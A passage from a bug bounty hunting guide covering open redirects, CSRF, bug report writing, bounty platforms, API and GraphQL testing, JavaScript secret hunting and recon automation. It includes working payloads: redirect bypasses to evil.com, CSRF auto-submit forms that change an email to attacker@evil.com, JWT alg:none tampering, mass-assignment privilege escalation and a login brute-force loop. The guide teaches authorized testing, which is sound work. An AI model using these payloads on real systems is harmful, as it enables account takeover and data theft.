# Protocol-relative (works on some filters)
//evil.com
//evil.com/path

# @-based bypass (filter checks if URL starts with https://example.com)
https://example.com@evil.com     → browser navigates to evil.com with user info = example.com

# Open redirect to open redirect
/login?next=//evil.com
/login?next=%2F%2Fevil.com

# Adding path prefix that tricks filter
https://example.com.evil.com     → goes to evil.com subdomain

# Fragment bypass
https://example.com#https://evil.com
```

### JavaScript-Based Redirects

Some redirects happen in JavaScript rather than HTTP headers. Look for:

```javascript
window.location = getParam('next');
document.location.href = returnUrl;
location.replace(target);
```

These accept different injection techniques. Try `javascript:alert(1)` to test for XSS via redirect:

```
?next=javascript:alert(document.domain)
```

If the application navigates to this, it is an XSS, not just an open redirect.

## Demonstrating Impact

For a bug report, show:

1. The vulnerable URL (with your own domain substituted, not an actual phishing URL)
2. The HTTP response showing `Location: https://[your-test-domain]`
3. Explain the phishing scenario

**Severity:** Open redirects are usually Low to Medium. They become High when chained with OAuth to steal tokens, or when combined with SSO authentication flows on sensitive applications.

## Summary

Open redirects allow attackers to use a trusted domain as a stepping stone to redirect users to malicious URLs. They are found in any parameter that controls where the user goes after an action. Severity is low alone but increases significantly when chained with OAuth or authentication flows.

---

## Checklist

- [ ] Searched for redirect parameters across the application (next, redirect, return_to, url, etc.)
- [ ] Found all login, logout, and OAuth callback pages — checked their redirect parameters
- [ ] Tested with `https://evil.com` as the redirect value
- [ ] Tested with `//evil.com` (protocol-relative)
- [ ] Tested with `https://example.com@evil.com`
- [ ] Tested with `javascript:alert(1)` to check for XSS upgrade
- [ ] Tested URL-encoded values: `%2F%2Fevil.com`
- [ ] Identified whether redirect parameters appear in OAuth flows
- [ ] Documented HTTP response showing attacker-controlled Location header

---

# Chapter 27: CSRF

## Objective

Understand what Cross-Site Request Forgery is, how browsers enable it, how applications defend against it, and how to test for CSRF bypasses.

## Prerequisites

- Chapter 3: HTTP
- Chapter 4: Browsers and Developer Tools
- Chapter 18: Authentication Vulnerabilities (recommended)

## Terminology

|Term|Definition|
|---|---|
|**CSRF**|Cross-Site Request Forgery — tricking a victim's browser into making an unauthorized request|
|**CSRF Token**|A secret, per-session value embedded in forms to verify requests came from the application|
|**SameSite Cookie**|A cookie attribute that restricts cross-site sending: `Strict`, `Lax`, or `None`|
|**Preflight Request**|An OPTIONS request the browser sends before a cross-origin request with custom headers|
|**CORS**|Cross-Origin Resource Sharing — a policy governing cross-origin HTTP requests|
|**State-Changing Request**|Any request that modifies data: POST, PUT, DELETE, PATCH|

## Theory

### How CSRF Works

Browsers automatically include cookies with every request to a domain — even if that request is initiated by a page on a _different_ domain. CSRF exploits this.

**The attack:**

1. The victim is logged into `bank.com`. Their session cookie is stored in the browser.
2. The victim visits `evil.com` (maybe a phishing email or a compromised ad).
3. `evil.com` contains an HTML form or image tag that submits a request to `bank.com`:

```html
<!-- On evil.com -->
<form action="https://bank.com/transfer" method="POST" id="csrf">
  <input name="to" value="attacker">
  <input name="amount" value="10000">
</form>
<script>document.getElementById('csrf').submit();</script>
```

4. The browser sends the request to `bank.com`, automatically including the victim's session cookie.
5. `bank.com` receives an authenticated request — it cannot distinguish it from one the victim submitted voluntarily.

### CSRF Defenses and How to Bypass Them

#### Defense 1: CSRF Tokens

The application generates a random token, embeds it in forms, and validates it on the server. Since `evil.com` cannot read the token (same-origin policy blocks cross-origin reads), it cannot forge a valid request.

**Bypass attempts:**

- **Remove the token entirely** — some servers only validate if a token is _present_, not if it's absent. Send the request without the `csrf_token` parameter at all.
- **Send an empty token** — `csrf_token=` — some validators accept empty strings.
- **Use another user's token** — if tokens are not tied to the session, any valid token works.
- **Predict the token** — poor implementations use sequential or time-based tokens.

#### Defense 2: SameSite Cookie Attribute

Modern browsers set `SameSite=Lax` by default on cookies that don't specify the attribute. `Lax` allows top-level navigation (clicking a link) but blocks form POST from cross-site pages.

**Bypass for Lax:**

- `SameSite=Lax` still allows GET requests initiated by top-level navigation. If the state-changing operation uses GET, it is still vulnerable.
- Some applications set `SameSite=None` explicitly, making them vulnerable.

#### Defense 3: Referer / Origin Header Validation

Some applications check the `Referer` or `Origin` header to confirm the request came from their domain.

**Bypass:**

```
Remove the Referer header entirely (some proxies strip it, some servers accept requests without it)
Set Origin: null (some servers accept null origin)
```

### Testing Methodology

**Step 1:** Find all state-changing requests (POST, PUT, DELETE). In Burp, right-click a request and select **Engagement Tools → Generate CSRF PoC**.

**Step 2:** Try removing the CSRF token from the request. If the server accepts it, CSRF is present.

**Step 3:** Try sending an empty token (`csrf_token=`). Check if accepted.

**Step 4:** Log into a second account, copy that account's CSRF token, and use it in the first account's request. If accepted, tokens are not tied to sessions.

**Step 5:** Check the SameSite attribute of session cookies in DevTools (Application → Cookies). If `None` or not set in older browsers, cross-site requests carry the cookie.

**Step 6:** For JSON APIs, check if the server validates `Content-Type`. If a form POST with `Content-Type: text/plain` is accepted when the server expects JSON, a cross-origin form can submit it.

### CSRF PoC Template

Burp Suite generates this automatically, but understanding it is useful:

```html
<html>
<body>
  <h1>CSRF PoC</h1>
  <form action="https://target.com/api/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
    <!-- If CSRF token required, remove it to test, or try another user's value -->
  </form>
  <script>document.forms[0].submit();</script>
</body>
</html>
```

Host this on a different origin (or Burp's browser preview) and submit as the logged-in victim.

## Summary

CSRF tricks the browser into making authenticated requests on behalf of a victim by exploiting the browser's automatic cookie inclusion. It is mitigated by CSRF tokens, SameSite cookies, and Referer validation — but each defense can have bypasses. Testing involves removing tokens, swapping tokens between accounts, and verifying SameSite cookie attributes. CSRF is most impactful on state-changing operations with no secondary confirmation (like email/password changes, fund transfers, and admin actions).

---

## Checklist

- [ ] Listed all state-changing requests in the application
- [ ] Generated CSRF PoC for each via Burp (right-click → Engagement Tools)
- [ ] Tested by removing the CSRF token entirely — does the server still accept the request?
- [ ] Tested with an empty CSRF token value
- [ ] Tested with another account's CSRF token
- [ ] Checked session cookie SameSite attribute (Strict/Lax/None/not set)
- [ ] Checked if any state-changing actions use GET requests (vulnerable under SameSite=Lax)
- [ ] Tried removing Referer header manually
- [ ] Tested JSON endpoints: does changing Content-Type to text/plain allow cross-site submission?
- [ ] Documented the vulnerable request, the PoC HTML, and the server's response

---

# PART FIVE: REPORTING

---

# Chapter 28: Writing Professional Bug Reports

## Objective

Learn how to write clear, complete, and professional bug reports that get triaged quickly, assessed at the correct severity, and result in payment.

## Prerequisites

All previous chapters. You've found a bug — now report it.

## Terminology

|Term|Definition|
|---|---|
|**Triage**|The platform/company team's process of validating and classifying your report|
|**Severity**|The rating assigned to a bug (Critical, High, Medium, Low, Informational)|
|**CVSS**|Common Vulnerability Scoring System — a standardized severity scoring framework|
|**Duplicate**|A report that covers a vulnerability already reported by another researcher|
|**N/A (Not Applicable)**|A report rejected because it's out of scope, not a vulnerability, or intentional behavior|
|**Reproducibility**|Whether the company's triage team can reproduce the vulnerability from your steps|
|**PoC**|Proof of Concept — a working demonstration of the vulnerability|

## Theory

### Why Report Quality Matters

The report is as important as the finding. A critical vulnerability with a poor report may:

- Be marked as insufficient information and delayed
- Be assessed at a lower severity than it deserves
- Be closed as N/A if the triage team can't reproduce it

A well-written report:

- Gets triaged immediately (less competition from duplicates)
- Gets assessed at the correct severity
- Builds your reputation on the platform
- Results in faster payment

### The Standard Report Structure

Every professional bug report includes these sections:

#### 1. Title

Clear, specific, and technical. State the vulnerability type, the affected component, and what it leads to.

```
❌ Bad:  "XSS found"
❌ Bad:  "Security issue in profile page"
✓ Good: "Reflected XSS in search parameter allows JavaScript execution in victim browsers"
✓ Good: "IDOR in /api/v1/orders/{id} allows any authenticated user to read other users' order details"
✓ Good: "Stored XSS via SVG upload in profile picture leads to account takeover"
```

#### 2. Summary (2–4 sentences)

A concise description of the vulnerability. What is the flaw, where is it, and what can an attacker do with it?

```
The /api/v1/orders/{id} endpoint fails to verify that the authenticated user 
owns the requested order. An attacker with any valid account can enumerate 
sequential order IDs to retrieve order details (billing address, items, payment 
method last four digits) belonging to other users. This affects all orders in 
the application.
```

#### 3. Severity (with justification)

State your assessment and briefly explain it. Reference CVSS factors if you know them:

```
Severity: High

Justification: Unauthenticated access is not possible (requires valid session), 
but any authenticated user can access all other users' orders. Data exposed 
includes PII (name, address) and partial payment information. Write access is 
not possible through this endpoint.
```

#### 4. Steps to Reproduce

The most important section. Numbered, precise steps that anyone can follow to reproduce the vulnerability. Include every detail:

```
Prerequisites:
- Two accounts: Account A (attacker@test.com) and Account B (victim@test.com)
- Both accounts should have at least one order

Steps:
1. Log in as Account B. Place an order. Note the order ID from the URL:
   https://example.com/orders/10042

2. Log out. Log in as Account A.

3. Open Burp Suite. Navigate to:
   https://example.com/api/v1/orders/10042

4. Observe that the response returns Account B's order details:
   {
     "order_id": 10042,
     "user_id": 8834,
     "email": "victim@test.com",
     "items": [...],
     "billing_address": {...}
   }

5. Account A's user_id is 9012. The response belongs to user 8834 (Account B).
```

#### 5. Proof of Concept (PoC)

Attach screenshots, HTTP request/response captures (from Burp), and any exploit code. For web vulnerabilities:

- Screenshot of the full Burp request
- Screenshot of the full Burp response showing the impact
- For XSS: screenshot of the alert or executed payload with the domain visible
- For CSRF: the HTML PoC file

#### 6. Impact

Explain what an attacker actually achieves. Be specific. Connect the technical flaw to a real-world consequence:

```
An attacker can enumerate all order IDs (sequential integers) to harvest 
the shipping addresses, email addresses, and purchase history of all 
customers. With approximately 500,000 orders in the system (based on the 
order ID range observed), a mass enumeration attack could expose the PII 
of all customers. This data could be used for phishing, identity theft, 
or sold to third parties.
```

#### 7. Remediation (Optional but appreciated)

A brief suggestion for fixing the vulnerability. Keep it technical and specific:

```
The /api/v1/orders/{id} endpoint should verify that the authenticated 
user's ID matches the user_id field of the requested order before 
returning the data. Return 403 Forbidden if the IDs do not match.
```

### Severity Assessment

Use CVSS as a guide (you do not need to compute an exact score, but understand the factors):

|Factor|Questions to ask|
|---|---|
|**Attack Vector**|Remote (network) or does it require local access?|
|**Authentication**|Does the attacker need to be logged in?|
|**Privileges Required**|Does the attacker need an admin or special role?|
|**User Interaction**|Does a victim need to click something?|
|**Confidentiality**|Is sensitive data disclosed?|
|**Integrity**|Can data be modified?|
|**Availability**|Can the service be disrupted?|

Common severity mappings:

|Vulnerability|Typical Severity|
|---|---|
|Unauthenticated RCE|Critical|
|Authenticated RCE|High–Critical|
|SQLi with data exfiltration|High–Critical|
|Account takeover (ATO)|High–Critical|
|IDOR exposing PII (mass)|High|
|IDOR exposing PII (single user)|Medium–High|
|Stored XSS|Medium–High|
|Reflected XSS|Medium|
|CSRF on sensitive action|Medium|
|Open redirect|Low–Medium|
|Self-XSS|Informational|

### Common Mistakes That Get Reports Rejected

1. **Missing reproduction steps** — triage cannot reproduce; report is delayed or closed
2. **Testing on production data** — accessing real user data beyond what's needed; violates program rules
3. **Out-of-scope target** — read the scope carefully before reporting
4. **Self-XSS** — XSS that only fires in your own browser is not exploitable
5. **Missing authentication** — reporting a vulnerability without noting it requires a logged-in account
6. **Exaggerated severity** — claiming CVSS 10 for a Low vulnerability damages credibility
7. **Missing evidence** — reports without screenshots or request/response captures

### Professional Communication

After submitting:

- Allow at least 5–10 business days for initial triage before following up
- Follow up politely: "Could you provide an update on the status of this report?"
- If you disagree with a severity downgrade, present a reasoned argument, not an emotional one
- Accept duplicates gracefully — they happen to everyone

## Summary

A professional bug report is clear, reproducible, and evidence-backed. The title is specific, the steps are numbered and complete, and the impact is articulated in business terms. Quality reports are triaged faster, rated correctly, and build your reputation with program teams.

---

## Checklist

- [ ] Title is specific: includes vulnerability type, affected component, and outcome
- [ ] Summary is 2–4 sentences explaining the flaw and its impact
- [ ] Severity is stated with justification
- [ ] Steps to reproduce are numbered and cover prerequisites
- [ ] PoC includes full Burp request and response screenshots
- [ ] Impact explains real-world consequence, not just technical description
- [ ] Tested using dedicated test accounts, not real user accounts
- [ ] Confirmed the bug is in-scope before submitting
- [ ] Did not test on production data beyond what's required to demonstrate the issue
- [ ] Remediation suggestion included (optional but professional)

---

# Chapter 29: Bug Bounty Platforms and Programs

## Objective

Understand the major bug bounty platforms, how to choose programs, and how to maximize your efficiency as a researcher.

## Prerequisites

- Chapter 1: What Is Bug Bounty Hunting?
- Chapter 28: Writing Professional Bug Reports (recommended)

## Terminology

|Term|Definition|
|---|---|
|**Public Program**|Open to all researchers|
|**Private Program**|Invite-only; invitations are based on reputation and track record|
|**VDP**|Vulnerability Disclosure Program — no bounty, only acknowledgment|
|**Reputation**|A score on bug bounty platforms earned through valid reports|
|**Signal**|HackerOne's metric for report quality (valid vs noise ratio)|
|**Response Efficiency**|How quickly and fairly a program triages reports|
|**Bounty Table**|A program's reward amounts by severity|

## Theory

### Choosing Your First Program

Not all programs are equally beginner-friendly. Evaluate a program on:

**1. Scope breadth:** More in-scope assets = more attack surface = more opportunities.

**2. Response time:** Look at the program's median time to first response and median time to bounty. Programs with weeks of silence are frustrating for beginners.

**3. Bounty vs VDP:** VDPs pay nothing. Start with bounty programs.

**4. Asset type:** "Web application" is more beginner-accessible than "Android app" or "binary exploitation."

**5. Competition level:** Older, well-known programs have more researchers hunting them — a higher chance of duplicates. Newer programs are less picked-over.

### Platform Overview

#### HackerOne (hackerone.com)

The largest platform by researcher count and program count. Good for:

- Finding public programs across all industries
- Building reputation that unlocks private programs
- Access to Hacktivity (public disclosed reports — essential for learning)

Key features: Signal score, reputation system, public report disclosure, Hacktivity feed.

#### Bugcrowd (bugcrowd.com)

Large platform with a different trust and classification system. Bugcrowd has its own VRTX (Vulnerability Rating Taxonomy) for severity classification. Good for:

- Beginners (detailed severity taxonomy reduces disputes)
- Wide variety of program types

#### Intigriti (intigriti.com)

European-focused with high-quality programs and an active community. Known for responsive programs and fair triaging. Good for researchers in Europe and those wanting less competition than HackerOne.

#### YesWeHack (yeswehack.com)

Strong in Europe and Asia-Pacific. Growing program count. Less competitive than HackerOne.

#### Synack (synack.com)

Invitation-only platform for professional-level researchers. Requires passing a skills assessment. Programs are vetted enterprises paying premium bounties. Goal for advanced researchers.

### Hunting Strategy

**Approach 1: Wide vs Deep**

_Wide:_ Hunt many different programs, looking for easy wins in new or lightly-tested areas. Good for beginners building experience.

_Deep:_ Master one application completely — understand every feature, every API endpoint, every business logic flow. Find bugs others miss because they didn't go deep enough. Better for earning larger bounties.

**Approach 2: Follow New Launches**

New programs, new features, and new acquisitions are less tested. Monitor:

- HackerOne's "New Programs" filter
- Company tech blogs and press releases (new feature = new attack surface)
- Company acquisitions (acquired apps often have worse security)

**Approach 3: Specialize**

Become deeply skilled in one area — mobile applications, OAuth flows, GraphQL APIs, cloud misconfigurations. Specialization lets you find bugs others can't.

### Learning from Disclosed Reports

Hacktivity (HackerOne) and Bugcrowd's disclosed reports are the best free learning resource in bug bounty:

- Read 10 reports on a vulnerability type before hunting it
- Understand what the triage team accepted and why
- Understand what got marked N/A and why
- Study the writing style of top researchers

Websites with aggregated disclosed reports:

- `hackerone.com/hacktivity`
- `pentester.land/list-of-bug-bounty-writeups`
- `github.com/ngalongc/bug-bounty-reference`

### Building Reputation

On HackerOne and Bugcrowd, reputation unlocks private programs, which tend to:

- Pay more
- Have less competition
- Have more responsive triage

Build reputation by:

- Submitting valid reports (even Low/Medium)
- Maintaining a high signal (valid report ratio)
- Not submitting noise (informational issues, out-of-scope, duplicates that should have been avoided)

## Summary

The major platforms are HackerOne, Bugcrowd, Intigriti, and YesWeHack. Choose programs based on scope breadth, response time, asset type, and competition level. Build reputation by submitting valid, well-written reports. Read disclosed reports as your primary learning tool — they show exactly what kinds of bugs get accepted and how to write about them.

---

## Checklist

- [ ] Created accounts on HackerOne and Bugcrowd
- [ ] Read at least 20 disclosed reports on Hacktivity before hunting
- [ ] Chosen a first program based on scope breadth and response time
- [ ] Understood the program's scope (what is in and out of scope)
- [ ] Noted the bounty table for your chosen program
- [ ] Set up a notes system to track tested endpoints and findings

---

# PART SIX: ADVANCED

---

# Chapter 30: API Security Testing

## Objective

Learn how to systematically test REST and GraphQL APIs for authentication, authorization, and logic vulnerabilities — including how to discover and document undisclosed API endpoints.

## Prerequisites

- Chapter 3: HTTP
- Chapter 7: Burp Suite
- Chapter 14: Web Application Mapping
- Chapters 15–27: Vulnerability Chapters

## Terminology

|Term|Definition|
|---|---|
|**REST**|Representational State Transfer — an API design style using HTTP verbs and resource URLs|
|**GraphQL**|A query language for APIs that allows clients to request exactly the data they need|
|**Swagger / OpenAPI**|A specification format for documenting REST APIs; often hosted at `/api/docs` or `/swagger`|
|**Introspection**|A GraphQL feature that allows querying the schema — the full list of available types and operations|
|**JWT**|JSON Web Token — a signed token format used for API authentication|
|**API Key**|A static secret token used to authenticate API requests|
|**Rate Limiting**|Restricting how many requests a client can make in a time period|

## Theory

### Why APIs Deserve Special Attention

APIs are the backbone of modern applications. Mobile apps, single-page web apps, and third-party integrations all communicate via API. They often:

- Expose more functionality than the visible web UI
- Have inconsistent access controls (some endpoints missed during development)
- Return more data than the UI displays (the UI filters it, but the API sends it all)
- Are developed faster with less security review

### Discovering API Endpoints

**1. From Swagger / OpenAPI documentation:**

Many applications expose their API documentation publicly:

```
https://api.example.com/docs
https://api.example.com/swagger
https://api.example.com/openapi.json
https://api.example.com/api-docs
https://example.com/v1/api/swagger.json
```

Swagger UI lists every endpoint, parameter, and expected response. Import it into Burp for automated scanning.

**2. From JavaScript files:**

API endpoints are often hardcoded in JavaScript. Use Burp's JS analysis or browser DevTools Sources tab to search for:

```
fetch('/api/
axios.get('/api/
$.ajax({ url: '/api/
const API_URL = '
/v1/
/v2/
```

Or use `LinkFinder` or `SecretFinder` (see Chapter 31) to extract endpoints automatically.

**3. From Burp's proxy history:**

Every API call the web application makes is captured in Burp's HTTP history. Filter for `/api/` to list all observed endpoints.

**4. From mobile apps:**

The companion mobile app often calls the same API. Decompile or MITM-proxy the mobile app to discover undocumented endpoints.

### REST API Testing Checklist

Once you have a list of endpoints, test each one:

**Authentication:**

- Access without any token — does the server return 401 or 200?
- Use an expired JWT — does the server reject it?
- Use a JWT with a modified payload — if the server doesn't validate the signature, you can forge any identity

**JWT-specific attacks:**

```
# Algorithm confusion: change alg to "none"
# Original header: {"alg":"HS256","typ":"JWT"}
# Modified header: {"alg":"none","typ":"JWT"}
# Remove the signature entirely

# Original: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWxpY2UifQ.SIGNATURE
# Tampered: eyJhbGciOibm9uZSIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.
```

**Authorization (IDOR on steroids):**

- Every endpoint that references a resource ID: test with IDs belonging to other users
- Test HTTP verb changes: GET → PUT/DELETE on the same URL
- Test version downgrade: `/api/v2/orders/123` secured, `/api/v1/orders/123` not?

**Mass Assignment:**

APIs often accept JSON objects. Try sending extra fields that should not be user-writable:

```json
PUT /api/users/me
{
  "email": "newemail@example.com",
  "role": "admin",          ← Should not be writable by users
  "is_verified": true,      ← Should not be writable by users
  "account_balance": 99999  ← Should not be writable by users
}
```

If the server accepts and applies `role: admin`, you have privilege escalation.

**Rate Limiting:**

```bash
# Test if rate limiting exists on authentication endpoints
for i in $(seq 1 100); do
  curl -s -X POST https://api.example.com/login \
    -H "Content-Type: application/json" \
    -d '{"email":"victim@example.com","password":"guess'$i'"}' &
done
```

No lockout after 100 failed attempts = no rate limiting = brute force possible.

### GraphQL Testing

GraphQL uses a single endpoint (typically `/graphql` or `/api/graphql`) and accepts queries in the request body.

**Step 1: Enable introspection**

```graphql
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
```

If introspection is enabled, you get the entire API schema. Use **InQL** (Burp extension) or **GraphQL Voyager** to visualize it.

**Step 2: Test for IDOR in queries**

```graphql
# Replace your own user ID with another user's ID
query {
  user(id: "1002") {
    email
    phone
    privateData
  }
}
```

**Step 3: Test for mutations**

```graphql
mutation {
  deleteUser(id: "1002") {
    success
  }
}
```

**Step 4: Test for introspection in production**

Many applications disable introspection in production but forget to disable it on staging or have regex-based filters with bypasses:

```graphql
# Bypass introspection block with aliases or field suggestions
{
  __schema { types { name } }        # Standard — often blocked
  {__schema{types{name}}}            # No whitespace — sometimes bypasses regex
}
```

**Step 5: Batching attacks**

GraphQL allows sending multiple operations in one request. Use this to bypass rate limiting:

```json
[
  {"query": "mutation { login(email:\"user@a.com\", password:\"pass1\") { token } }"},
  {"query": "mutation { login(email:\"user@a.com\", password:\"pass2\") { token } }"},
  ...
]
```

One HTTP request = 100 login attempts = no IP-based rate limit fires.

## Summary

APIs require the same vulnerability testing as web UIs, plus API-specific attacks: JWT algorithm confusion, mass assignment, GraphQL introspection, and batching attacks. Start by discovering the full API surface (Swagger, JS files, Burp history), then systematically apply authorization tests and input fuzzing to each endpoint.

---

## Checklist

- [ ] Discovered all API endpoints (Swagger docs, JS analysis, Burp history)
- [ ] Tested unauthenticated access to every endpoint
- [ ] Tested JWT: expired tokens, `alg:none` attack, modified payload
- [ ] Tested IDOR on every endpoint referencing a resource ID (with two test accounts)
- [ ] Tested HTTP verb changes on every endpoint (GET → POST/PUT/DELETE)
- [ ] Tested version downgrade (v2 → v1)
- [ ] Tested mass assignment: submitted extra privileged fields in PUT/PATCH requests
- [ ] Tested rate limiting on authentication endpoints (login, OTP, password reset)
- [ ] If GraphQL: ran introspection query
- [ ] If GraphQL: tested IDOR in queries and mutations
- [ ] If GraphQL: tested batching for rate limit bypass

---

# Chapter 31: JavaScript Analysis

## Objective

Learn how to extract secrets, API endpoints, and hidden functionality from JavaScript files — a critical skill for finding modern web application vulnerabilities.

## Prerequisites

- Chapter 4: Browsers and Developer Tools
- Chapter 7: Burp Suite
- Chapter 9: Reconnaissance Tools

## Terminology

|Term|Definition|
|---|---|
|**Minification**|Removing whitespace and shortening variable names to reduce JS file size|
|**Source Map**|A file that maps minified code back to original source code; often accidentally left in production|
|**Hardcoded Secret**|An API key, password, or token literally written into source code|
|**Endpoint**|A URL path found in JavaScript code that the application uses to make API calls|
|**Webpack**|A common JavaScript bundler that packages all JS into a single file (or a few)|
|**Dead Code**|Code that is included in the bundle but never called from the UI — often contains hidden functionality|

## Theory

### Why JavaScript Analysis Matters

Modern web applications send significant business logic to the browser in JavaScript. Inside that code, researchers find:

- **Hardcoded secrets** — API keys, tokens, credentials left by developers
- **Hidden API endpoints** — routes not linked from the UI but callable directly
- **Disabled features** — functionality hidden from the UI but still active server-side
- **Business logic** — understanding how the client validates data helps craft better server-side tests
- **Source maps** — accidentally published source code, which reveals the application's internal architecture

### Step 1: Collect All JavaScript Files

In Burp Suite's HTTP history, filter for `.js` responses. Alternatively:

```bash
# Use gau (GetAllURLs) to collect all JS URLs from web archives
gau example.com | grep '\.js$' | sort -u > js_files.txt

# Use hakrawler or gospider to crawl and collect JS
gospider -s https://example.com -o output/ -c 10 --js

# Download all collected JS files
while read url; do
    curl -s "$url" -o "$(echo $url | md5sum | cut -d' ' -f1).js"
done < js_files.txt
```

### Step 2: Find Secrets with SecretFinder / truffleHog

**SecretFinder** (Python tool) scans JS files for secrets using regex patterns:

```bash
python SecretFinder.py -i https://example.com/static/app.js -o cli
```

**truffleHog** scans for high-entropy strings (likely to be secrets):

```bash
trufflehog filesystem ./js_files/
```

**Manual patterns to search for:**

```bash
grep -Ei "api_key|apikey|api-key|secret|token|password|auth|bearer|private_key" *.js
grep -Ei "AWS_ACCESS|AZURE|firebase|stripe|twilio|sendgrid" *.js

# High-entropy strings (base64-encoded secrets are ~40+ random characters)
grep -Eo '[A-Za-z0-9+/]{40,}={0,2}' *.js | sort -u
```

### Step 3: Extract Endpoints with LinkFinder

**LinkFinder** extracts URL patterns from JavaScript:

```bash
python linkfinder.py -i https://example.com/static/app.js -o cli

# Or run against a complete domain
python linkfinder.py -i https://example.com -d -o results.html
```

Look for:

- `/api/v1/admin/...` paths (admin APIs)
- `/internal/...` paths
- `/debug/...` paths
- `/v2/...` paths (newer API versions)

### Step 4: Source Maps

When a JavaScript file has been compiled from TypeScript or bundled with Webpack, it may have an associated source map file. Source maps are meant for development debugging but are sometimes deployed to production.

```bash
# If app.js exists, check for source map
curl https://example.com/static/app.js.map

# If the JS file contains a sourceMappingURL comment:
# //# sourceMappingURL=app.js.map
```

If a `.js.map` file exists, download it and use **sourcemapper** to reconstruct the original source:

```bash
sourcemapper -url https://example.com/static/app.js.map -output ./source_output/
```

Original source code reveals:

- Internal function names and logic
- Comments explaining features
- Test credentials or debug flags
- Architecture and routing information

### Step 5: Webpack Bundle Analysis

Modern single-page apps are bundled with Webpack. The bundle often includes multiple "chunks." Each chunk may contain different features:

```bash
# Common Webpack bundle filenames
/static/js/main.HASH.js         # Main app bundle
/static/js/chunk.HASH.js        # Lazy-loaded chunk (specific feature)
/static/js/vendor.HASH.js       # Third-party libraries

# Enumerate chunks by guessing
# If you see main.abc123.js, try vendor.abc123.js, runtime.abc123.js
```

### Step 6: Deobfuscation

Heavily obfuscated code can be partially deobfuscated:

```bash
# Beautify minified JS
js-beautify -f app.js -o app_formatted.js

# Or use online tools:
# prettier.io, beautifier.io, deobfuscate.io
```

After formatting, search for interesting patterns manually.

### Practical: Finding a Hidden Admin Endpoint

1. Download all JS files from the application
2. Run `linkfinder.py` — output includes `/api/admin/users`
3. Try the endpoint unauthenticated and as a regular user
4. If it returns admin data to a regular user → Critical authorization bypass

## Summary

JavaScript analysis reveals secrets, hidden endpoints, and business logic. Use automated tools (SecretFinder, LinkFinder) for the broad scan, then manually review the interesting files. Source maps are a goldmine when accidentally deployed. Always check for Webpack chunks beyond the main bundle.

---

## Checklist

- [ ] Collected all JS file URLs from the application (Burp history, gau, gospider)
- [ ] Downloaded all JS files for offline analysis
- [ ] Ran SecretFinder or truffleHog for hardcoded secrets
- [ ] Ran LinkFinder for hidden API endpoints
- [ ] Manually grepped for api_key, token, secret, password, bearer
- [ ] Checked for source map files (`.js.map`) on each JS bundle
- [ ] If source maps found: extracted and reviewed original source with sourcemapper
- [ ] Enumerated Webpack chunks (main, vendor, runtime, lazy-loaded chunks)
- [ ] Added newly discovered endpoints to the Burp target scope for further testing

---

# Chapter 32: Building Automation Pipelines

## Objective

Learn how to build a personal recon and testing automation pipeline that continuously discovers new attack surface, allowing you to be first to test new features and subdomains.

## Prerequisites

- Chapter 5: Linux
- Chapter 6: Lab Environment
- Chapter 9: Reconnaissance Tools
- Chapter 13: Subdomain Enumeration

## Terminology

|Term|Definition|
|---|---|
|**Pipeline**|A series of automated steps, each passing output to the next|
|**Monitor**|Automated checking for new or changed assets on a schedule|
|**Notify**|Sending an alert (Slack, Telegram, email) when something interesting is discovered|
|**Nuclei**|A community-driven vulnerability scanner using YAML-based templates|
|**httpx**|A fast HTTP probe tool from ProjectDiscovery|
|**anew**|A tool that only outputs new lines — used to detect changes between scans|
|**Wordlist**|A file containing words, paths, or values used in fuzzing and enumeration|

## Theory

### Why Automation Matters

The bug bounty ecosystem is competitive. Fresh attack surface — a newly added subdomain, a just-deployed API version, a new feature — has fewer researchers looking at it. The researcher who finds and tests it first wins.

Manual reconnaissance is slow. An automated pipeline can:

- Monitor for new subdomains every 24 hours
- Alert you when a new subdomain appears
- Automatically probe new assets for live services
- Run basic vulnerability checks automatically
- Free your time for manual creative testing

### The Core Pipeline

```
Subdomain Enumeration
        ↓
    DNS Resolution
        ↓
  HTTP Probing (which hosts respond?)
        ↓
  Port Scanning (what services are running?)
        ↓
  Change Detection (what's new since last run?)
        ↓
  Alerting (notify via Slack/Telegram)
        ↓
  Automated Scanning (Nuclei, ffuf)
        ↓
  Manual Testing (you, with fresh targets)
```

### Tool Stack

|Tool|Purpose|Install|
|---|---|---|
|`subfinder`|Passive subdomain enumeration|`go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest`|
|`amass`|Active + passive subdomain enumeration|`go install github.com/owasp-amass/amass/v4/...@master`|
|`httpx`|HTTP probing (alive check, title, status, tech)|`go install github.com/projectdiscovery/httpx/cmd/httpx@latest`|
|`naabu`|Port scanner|`go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest`|
|`nuclei`|Vulnerability scanner (YAML templates)|`go install github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest`|
|`ffuf`|Web fuzzer (directory, parameter)|`go install github.com/ffuf/ffuf@latest`|
|`anew`|Append-only change detection|`go install github.com/tomnomnom/anew@latest`|
|`notify`|Multi-channel alerting|`go install github.com/projectdiscovery/notify/cmd/notify@latest`|

### Building the Pipeline — Step by Step

#### Step 1: Subdomain Enumeration

```bash
#!/bin/bash
TARGET="example.com"
OUTPUT_DIR="$HOME/recon/$TARGET"
mkdir -p $OUTPUT_DIR

# Passive enumeration
subfinder -d $TARGET -silent -o $OUTPUT_DIR/subdomains_passive.txt

# Active enumeration (DNS brute force)
amass enum -d $TARGET -o $OUTPUT_DIR/subdomains_active.txt

# Combine and deduplicate
cat $OUTPUT_DIR/subdomains_*.txt | sort -u > $OUTPUT_DIR/subdomains_all.txt
echo "[+] Found $(wc -l < $OUTPUT_DIR/subdomains_all.txt) unique subdomains"
```

#### Step 2: Change Detection with anew

`anew` only prints lines that are new compared to a baseline file. Run this on every scan:

```bash
# First run: all subdomains are "new"
cat $OUTPUT_DIR/subdomains_all.txt | anew $OUTPUT_DIR/subdomains_baseline.txt > $OUTPUT_DIR/new_subdomains.txt

# Subsequent runs: only truly new subdomains appear in new_subdomains.txt
echo "[+] New subdomains this run: $(wc -l < $OUTPUT_DIR/new_subdomains.txt)"
```

#### Step 3: HTTP Probing

```bash
# Check which subdomains respond to HTTP/HTTPS
cat $OUTPUT_DIR/subdomains_all.txt | httpx \
    -silent \
    -status-code \
    -title \
    -tech-detect \
    -o $OUTPUT_DIR/live_hosts.txt

